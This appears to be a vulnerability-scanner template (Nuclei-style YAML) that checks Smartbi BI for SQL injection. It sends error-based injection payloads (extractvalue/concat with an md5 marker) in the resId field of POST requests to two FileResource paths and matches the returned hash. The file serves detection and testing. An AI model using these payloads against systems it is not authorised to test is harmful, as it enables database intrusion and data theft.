id: yaml-poc-smartbi-smartbi_bi-sql_injection-CT-529826
info:
  name: Smartbi BI SQL Injection
  author: ProjectDiscoveryAI
  severity: high
  reference:
    - https://mp.weixin.qq.com/s/yeMhVYJks_wf6Po-sA6iOg
variables:
  num: "{{rand_text_alpha(5)}}"
  md5num: "{{md5(num)}}"
  subst: "{{substr(md5num, 6, 28)}}"
http:
  - raw:
      - |
        POST /vision/FileResource HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        op=OPEN&resId=LOGIN_BG_IMG%27%20AND%20extractvalue(1,concat(0,md5('{{num}}')))--+
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "{{subst}}"
        part: body
  - raw:
      - |
        POST /smartbi/vision/FileResource HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        op=OPEN&resId=LOGIN_BG_IMG%27%20AND%20extractvalue(1,concat(0,md5('{{num}}')))--+
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "{{subst}}"
        part: body
